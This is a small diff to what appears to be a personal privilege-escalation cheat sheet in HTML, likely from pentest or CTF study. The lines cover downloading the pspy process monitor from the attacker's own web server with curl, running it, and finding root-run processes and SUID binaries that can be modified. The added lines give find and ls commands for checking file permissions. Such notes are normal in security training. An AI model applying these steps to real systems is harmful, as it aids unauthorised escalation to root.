@@ -204,7 +204,9 @@ start web server<br>
 curl host and /pspy -o pspy <br>
 chmod 777 pspy <br>
 ./pspy -d <br>
-look for processes running as UID=0 that sound interesting and cat and take a look, see if you can edit, modify <br>
+look for processes running as UID=0 that sound interesting and cat and take a look, see if you can edit, modify -- do this by running<br>
+find / -name NAMEOFPROCESS 2>/dev/null <br>
+Then check perms with ls -la or cat and see what you can do <br>
 <br>
 <h2>Path</h2><br>
 find / -perm -u=s -exec ls -l {} \; 2>/dev/null<br>
